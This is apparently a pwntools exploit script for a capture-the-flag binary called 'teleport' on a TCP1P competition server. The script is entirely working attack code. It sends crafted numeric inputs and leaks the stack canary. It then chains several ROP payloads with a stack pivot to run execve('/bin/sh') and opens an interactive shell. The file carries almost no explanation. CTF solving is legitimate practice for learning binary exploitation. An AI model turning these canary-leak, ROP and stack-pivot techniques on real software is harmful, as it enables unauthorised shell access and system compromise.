#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import ctypes

from pwn import *

elf = context.binary = ELF("./teleport", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc ctf.tcp1p.com 1470"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


io.sendline(str(0x80000000).encode() + b" " + str(0x180000000).encode())

io.send(b"/bin/sh".ljust(16, b"\x00"))
num = 13.37
raw_byte = struct.pack("f", num)
num = struct.unpack("I", raw_byte)[0]
# use IEEE 754 calculator convert from decimal (num) to get the hex representation
# https://www.h-schmidt.net/FloatConverter/IEEE754.html
io.sendlineafter(
    b"> ",
    str(num).encode() +
    b" " +
    str(0x4e82abd7).encode())

num1 = 0xdeadbeef
num2 = num1 | 2**32
num1 = struct.unpack("d", p64(num1))[0]
num2 = struct.unpack("d", p64(num2))[0]
io.sendlineafter(b"> ", str(num1).encode() + b" " + str(num2).encode())

io.recvuntil(b"it...\n")
canary = ctypes.c_uint64(int(io.recvline(keepends=False))).value
log.info(f"{canary=:#x}")

payload = b"A" * 0x8
payload += flat(
    canary,
    elf.bss(0xc00),
)
io.send(payload)

pop_rdi = 0x004b5c81
pop_rsi = 0x004b569f

# pop rax; pop rdx; pop rbx; ret;
pop_rax = 0x004accbf

syscall = 0x004022d4
leave_ret = 0x00401c6b

payload = b""
payload += flat(
    pop_rdi, elf.sym["anu"],
    pop_rsi, 0,
    pop_rax,
    canary,
    elf.bss(0xc00) + 0x28,
    elf.sym["cool_thing2"] + 0xb6,
)

time.sleep(0.1)
io.send(payload)

payload = b""
payload += flat(
    0x3b, 0,
    leave_ret + 1,
    leave_ret + 1,
    leave_ret + 1,
    leave_ret + 1,
    leave_ret + 1,
    elf.sym["cool_thing2"] + 0xb6,
)
time.sleep(0.1)
io.send(payload)

payload = b""
payload += flat(
    0x3b, 0, 0,
    syscall,
    0,
    canary,
    elf.bss(0xc00) - 0x38,
    leave_ret,
)
time.sleep(0.1)
io.send(payload)

io.interactive()
